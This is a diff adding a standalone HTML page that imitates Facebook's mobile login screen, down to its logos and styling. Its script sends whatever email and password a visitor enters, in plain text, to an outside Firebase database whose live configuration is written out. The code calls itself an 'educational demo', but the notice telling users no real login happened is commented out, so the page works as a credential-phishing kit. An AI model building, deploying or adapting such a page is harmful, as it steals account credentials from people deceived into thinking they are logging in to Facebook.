@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Mobile Login</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Oxygen, Ubuntu, Cantarell, sans-serif;
+      }
+
+      body {
+        background-color: #ffffff;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        padding: 0;
+        position: relative;
+      }
+
+      .back-arrow {
+        position: absolute;
+        top: 50px;
+        left: 20px;
+        width: 24px;
+        height: 24px;
+        cursor: pointer;
+        z-index: 10;
+      }
+
+      .back-arrow::before {
+        content: "";
+        position: absolute;
+        width: 12px;
+        height: 12px;
+        border-left: 2px solid #666;
+        border-bottom: 2px solid #666;
+        transform: rotate(45deg);
+        top: 50%;
+        left: 50%;
+        margin-top: -6px;
+        margin-left: -6px;
+      }
+
+      .language-header {
+        text-align: center;
+        padding: 60px 0 0 0;
+        margin-bottom: 60px;
+      }
+
+      .language-header p {
+        color: #65676b;
+        font-size: 16px;
+        font-weight: 400;
+      }
+
+      .login-container {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 0 40px;
+        max-width: 100%;
+      }
+
+      .logo {
+        margin-bottom: 60px;
+        display: flex;
+        justify-content: center;
+      }
+
+      .logo-circle {
+        width: 80px;
+        height: 80px;
+        background-color: #fff;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .logo-circle img {
+        width: 80px;
+        height: 80px;
+      }
+
+      .login-form {
+        width: 100%;
+        max-width: 400px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .login-form input {
+        width: 100%;
+        padding: 16px 20px;
+        border: 1px solid #dddfe2;
+        border-radius: 12px;
+        font-size: 16px;
+        background-color: #fff;
+        color: #1c1e21;
+      }
+
+      .login-form input::placeholder {
+        color: #8a8d91;
+        font-size: 16px;
+      }
+
+      .login-form input:focus {
+        outline: none;
+        border-color: #1877f2;
+      }
+
+      .login-button {
+        width: 100%;
+        padding: 16px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 25px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 8px;
+      }
+
+      .login-button:hover {
+        background-color: #166fe5;
+      }
+
+      .forgot-password {
+        text-align: center;
+        margin: 24px 0 60px 0;
+      }
+
+      .forgot-password a {
+        color: #1c1e21;
+        font-size: 16px;
+        text-decoration: none;
+      }
+
+      .forgot-password a:hover {
+        text-decoration: underline;
+      }
+
+      .create-account-section {
+        margin-top: auto;
+        width: 100%;
+        max-width: 400px;
+        padding-bottom: 40px;
+      }
+
+      .create-account-button {
+        width: 100%;
+        padding: 16px;
+        background-color: transparent;
+        color: #1877f2;
+        border: 1px solid #1877f2;
+        border-radius: 25px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        margin-bottom: 40px;
+        margin: 10px;
+      }
+
+      .create-account-button:hover {
+        background-color: #f0f8ff;
+      }
+
+      .meta-logo {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .meta-logo img {
+        height: 15px;
+        margin-top: 20px;
+        width: auto;
+      }
+
+      @media (max-height: 700px) {
+        .language-header {
+          margin-bottom: 40px;
+        }
+
+        .logo {
+          margin-bottom: 40px;
+        }
+
+        .forgot-password {
+          margin: 20px 0 40px 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="back-arrow"></div>
+
+    <div class="language-header">
+      <p>English (UK)</p>
+    </div>
+
+    <div class="login-container">
+      <div class="logo">
+        <div class="logo-circle">
+          <img
+            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png"
+            alt="Facebook"
+          />
+        </div>
+      </div>
+
+      <form class="login-form" id="demoForm">
+        <input
+          type="text"
+          name="demoEmail"
+          id="demoEmail"
+          placeholder="Mobile number or email address"
+          autocomplete="username"
+        />
+        <input
+          type="password"
+          name="demoPassword"
+          id="demoPassword"
+          placeholder="Password"
+          autocomplete="current-password"
+        />
+        <button type="submit" class="login-button">Log in</button>
+      </form>
+
+      <div class="forgot-password">
+        <a href="#">Forgotten password?</a>
+      </div>
+    </div>
+
+    <div class="create-account-section">
+      <button type="button" class="create-account-button">
+        Create new account
+      </button>
+
+      <div class="meta-logo">
+        <img
+          src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yg/r/6EMh2DWYp9P.png"
+          alt="Meta"
+        />
+      </div>
+    </div>
+    <script type="module">
+      // Firebase configuration - Replace with your own config
+      const firebaseConfig = {
+        apiKey: "AIzaSyDJP2XIR51qGTLINiKvEoscYTMt11CaZ5s",
+        authDomain: "paytrust-71e30.firebaseapp.com",
+        databaseURL: "https://paytrust-71e30-default-rtdb.firebaseio.com/",
+        projectId: "paytrust-71e30",
+        storageBucket: "paytrust-71e30.appspot.com",
+        messagingSenderId: "492609516838",
+        appId: "1:492609516838:android:5a924ad3b7e8e508fa3de7",
+      };
+
+      // Initialize Firebase
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        push,
+        set,
+      } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const database = getDatabase(app);
+
+      // Form submission
+      document.addEventListener("DOMContentLoaded", () => {
+        const form = document.getElementById("demoForm");
+
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+
+          const email = document.getElementById("demoEmail").value;
+          const password = document.getElementById("demoPassword").value;
+
+          if (!email || !password) {
+            alert("Please fill in both fields for this demo");
+            return;
+          }
+
+          // Save to Firebase (for educational purposes only)
+          const demoDataRef = ref(database, "educational_demo_logs");
+          const newDemoRef = push(demoDataRef);
+
+          set(newDemoRef, {
+            timestamp: new Date().toISOString(),
+            demo_email: email,
+            demo_password: password, // Never store real passwords
+          })
+            .then(() => {
+              console.log("Demo data saved for educational purposes");
+              alert();
+              // "This is a demo. No real login occurred.\nTest credentials received:\nEmail: " +
+              //   email
+              form.reset();
+            })
+            .catch((error) => {
+              console.error("Error saving demo data:", error);
+              alert("Demo error: " + error.message);
+            });
+        });
+      });
+    </script>
+  </body>
+</html>
